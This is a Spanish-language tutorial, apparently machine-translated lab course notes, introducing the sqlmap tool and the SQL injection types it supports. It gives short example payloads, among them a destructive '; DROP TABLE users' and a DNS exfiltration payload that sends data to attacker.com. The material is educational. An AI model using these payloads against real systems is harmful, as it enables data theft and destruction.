# Descripción general de SQLMAP

[Sqlmap](https://github.com/sqlmapproject/sqlmap)es una herramienta de prueba de penetración de código abierto y gratuita escrita en Python que automatiza el proceso de detección y explotación de fallas de inyección SQL (SQLI). SQLMAP se ha desarrollado continuamente desde 2006 y todavía se mantiene hoy.

Descripción general de SQLMAP

```
xnoxos@htb[/htb]$ python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'       ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.10.41#dev}|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 12:55:56

[12:55:56] [INFO] testing connection to the target URL
[12:55:57] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[12:55:58] [INFO] testing if the target URL content is stable
[12:55:58] [INFO] target URL content is stable
[12:55:58] [INFO] testing if GET parameter 'id' is dynamic
[12:55:58] [INFO] confirming that GET parameter 'id' is dynamic
[12:55:59] [INFO] GET parameter 'id' is dynamic
[12:55:59] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[12:56:00] [INFO] testing for SQL injection on GET parameter 'id'
<...SNIP...>

```

SQLMAP viene con un potente motor de detección, numerosas características y una amplia gama de opciones e interruptores para ajustar los muchos aspectos, tales como:

|  |  |  |
| --- | --- | --- |
| Conexión objetivo | Detección de inyección | Huellas dactilares |
| Enumeración | Mejoramiento | Detección de protección y derivación utilizando scripts "Tamper" |
| Recuperación de contenido de la base de datos | Acceso al sistema de archivos | Ejecución de los comandos del sistema operativo (OS) |

---

# **Instalación de SQLMAP**

SQLMAP está preinstalado en su PWNBox y la mayoría de los sistemas operativos centrados en la seguridad. SQLMAP también se encuentra en muchas bibliotecas de distribuciones de Linux. Por ejemplo, en Debian, se puede instalar con:

Descripción general de SQLMAP

```
xnoxos@htb[/htb]$ sudo apt install sqlmap
```

Si queremos instalar manualmente, podemos usar el siguiente comando en el terminal de Linux o en la línea de comando de Windows:

Descripción general de SQLMAP

```
xnoxos@htb[/htb]$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

Después de eso, SQLMAP se puede ejecutar con:

Descripción general de SQLMAP

```
xnoxos@htb[/htb]$ python sqlmap.py
```

---

# **Bases de datos compatibles**

SQLMAP tiene el mayor soporte para DBMSES de cualquier otra herramienta de explotación SQL. SQLMAP es compatible con los siguientes DBMSE:

|  |  |  |  |
| --- | --- | --- | --- |
| `MySQL` | `Oracle` | `PostgreSQL` | `Microsoft SQL Server` |
| `SQLite` | `IBM DB2` | `Microsoft Access` | `Firebird` |
| `Sybase` | `SAP MaxDB` | `Informix` | `MariaDB` |
| `HSQLDB` | `CockroachDB` | `TiDB` | `MemSQL` |
| `H2` | `MonetDB` | `Apache Derby` | `Amazon Redshift` |
| `Vertica`, `Mckoi` | `Presto` | `Altibase` | `MimerSQL` |
| `CrateDB` | `Greenplum` | `Drizzle` | `Apache Ignite` |
| `Cubrid` | `InterSystems Cache` | `IRIS` | `eXtremeDB` |
| `FrontBase` |  |  |  |

El equipo de SQLMAP también trabaja para agregar y admitir nuevos DBMSE periódicamente.

---

# **Tipos de inyección SQL compatibles**

SQLMAP es la única herramienta de prueba de penetración que puede detectar y explotar correctamente todos los tipos SQLI conocidos. Vemos los tipos de inyecciones SQL respaldadas por SQLMAP con el`sqlmap -hh`dominio:

Descripción general de SQLMAP

```
xnoxos@htb[/htb]$ sqlmap -hh...SNIP...
  Techniques:
    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

```

Los personajes de la técnica`BEUSTQ`se refiere a lo siguiente:

- `B`: Ciego a base de booleano
- `E`: Basado en errores
- `U`: Sindicato basado en consultas
- `S`: Consultas apiladas
- `T`: Ciego basado en el tiempo
- `Q`: Consultas en línea

---

# **Inyección de SQL ciega con sede en booleano**

Ejemplo de`Boolean-based blind SQL Injection`:

Código:sql

```sql
AND 1=1

```

Exploits sqlmap`Boolean-based blind SQL Injection`vulnerabilidades a través de la diferenciación de`TRUE`de`FALSE`Resultados de la consulta, recuperando efectivamente 1 byte de información por solicitud. La diferenciación se basa en comparar las respuestas del servidor para determinar si la consulta SQL regresó`TRUE`o`FALSE`. Esto abarca desde comparaciones difusas del contenido de respuesta sin procesar, códigos HTTP, títulos de página, texto filtrado y otros factores.

- `TRUE`Los resultados generalmente se basan en respuestas que no tienen ninguna diferencia marginal en la respuesta regular del servidor.
- `FALSE`Los resultados se basan en respuestas que tienen diferencias sustanciales con la respuesta regular del servidor.
- `Boolean-based blind SQL Injection`se considera como el tipo SQLI más común en aplicaciones web.

---

# **Inyección SQL basada en errores**

Ejemplo de`Error-based SQL Injection`:

Código:sql

```sql
AND GTID_SUBSET(@@version,0)

```

Si el`database management system` (`DBMS`) Los errores se devuelven como parte de la respuesta del servidor para cualquier problema relacionado con la base de datos, entonces existe la probabilidad de que puedan usarse para llevar los resultados para consultas solicitadas. En tales casos, se utilizan cargas útiles especializadas para los DBM actuales, dirigidos a las funciones que causan mal comportamiento conocidos. SQLMAP tiene la lista más completa de tales cargas y cubiertas relacionadas`Error-based SQL Injection`Para los siguientes dbmses:

|  |  |  |
| --- | --- | --- |
| Mysql | Postgresql | Oráculo |
| Microsoft SQL Server | Sybase | Vertica |
| IBM DB2 | Pájaro de fuego | Monetdb |

SQLI basado en errores se considera más rápido que todos los demás tipos, excepto la consulta de Union, porque puede recuperar una cantidad limitada (por ejemplo, 200 bytes) de datos llamados "fragmentos" a través de cada solicitud.

---

# **Basado en la consulta de la Unión**

Ejemplo de`UNION query-based SQL Injection`:

Código:sql

```sql
UNION ALL SELECT 1,@@version,3

```

Con el uso de`UNION`, generalmente es posible extender el original (`vulnerable`) consulta con los resultados de las declaraciones inyectadas. De esta manera, si los resultados de la consulta original se representan como parte de la respuesta, el atacante puede obtener resultados adicionales de las declaraciones inyectadas dentro de la respuesta de la página en sí. Este tipo de inyección SQL se considera la más rápida, ya que, en el escenario ideal, el atacante podría extraer el contenido de toda la tabla de interés de la base de datos con una sola solicitud.

---

# **Consultas apiladas**

Ejemplo de`Stacked Queries`:

Código:sql

```sql
; DROP TABLE users

```

Apilar consultas SQL, también conocidas como el "respaldo de piggy", es la forma de inyectar declaraciones SQL adicionales después de la vulnerable. En caso de que exista un requisito para ejecutar declaraciones no quirales (por ejemplo,`INSERT`, `UPDATE`o`DELETE`), el apilamiento debe ser compatible con la plataforma vulnerable (por ejemplo,`Microsoft SQL Server`y`PostgreSQL`admitirlo por defecto). SQLMAP puede usar tales vulnerabilidades para ejecutar declaraciones no quiradas ejecutadas en características avanzadas (por ejemplo, ejecución de comandos de SO) y recuperación de datos de manera similar a los tipos SQLI ciegos basados en el tiempo.

---

# **Inyección SQL ciega basada en el tiempo**

Ejemplo de`Time-based blind SQL Injection`:

Código:sql

```sql
AND 1=IF(2>1,SLEEP(5),0)

```

El principio de`Time-based blind SQL Injection`es similar al`Boolean-based blind SQL Injection`, pero aquí el tiempo de respuesta se usa como fuente de la diferenciación entre`TRUE`o`FALSE`.

- `TRUE`La respuesta generalmente se caracteriza por la diferencia notable en el tiempo de respuesta en comparación con la respuesta del servidor regular
- `FALSE`La respuesta debería dar como resultado un tiempo de respuesta indistinguible de los tiempos de respuesta regulares

`Time-based blind SQL Injection`es considerablemente más lento que el ciego sqli basado en booleano, ya que las consultas dan como resultado`TRUE`retrasaría la respuesta del servidor. Este tipo SQLI se usa en los casos donde`Boolean-based blind SQL Injection`no es aplicable. Por ejemplo, en caso de que la declaración SQL vulnerable no sea Quera (por ejemplo,`INSERT`, `UPDATE`o`DELETE`), ejecutado como parte de la funcionalidad auxiliar sin ningún efecto en el proceso de representación de la página, el SQLI basado en el tiempo se usa fuera de la necesidad, como`Boolean-based blind SQL Injection`Realmente no funcionaría en este caso.

---

# **Consultas en línea**

Ejemplo de`Inline Queries`:

Código:sql

```sql
SELECT (SELECT @@version) from

```

Este tipo de inyección incrustó una consulta dentro de la consulta original. Dicha inyección SQL es poco común, ya que necesita que la aplicación web vulnerable se escriba de cierta manera. Aún así, SQLMAP también admite este tipo de SQLI.

---

# **Inyección de SQL fuera de banda**

Ejemplo de`Out-of-band SQL Injection`:

Código:sql

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))

```

Este se considera uno de los tipos más avanzados de SQLI, utilizados en casos en que todos los demás tipos no son compatibles con la aplicación web vulnerable o son demasiado lentos (por ejemplo, SQLI ciega basado en el tiempo). SQLMAP admite SQLI fuera de banda a través de "Exfiltración DNS", donde las consultas solicitadas se recuperan a través del tráfico DNS.

Ejecutando el SQLMAP en el servidor DNS para el dominio bajo control (por ejemplo,`.attacker.com`), SQLMAP puede realizar el ataque forzando al servidor a solicitar subdominios inexistentes (por ejemplo,`foo.attacker.com`), dónde`foo`Sería la respuesta SQL que queremos recibir. SQLMAP puede recopilar estas solicitudes DNS de errores y recopilar el`foo`parte, para formar toda la respuesta SQL.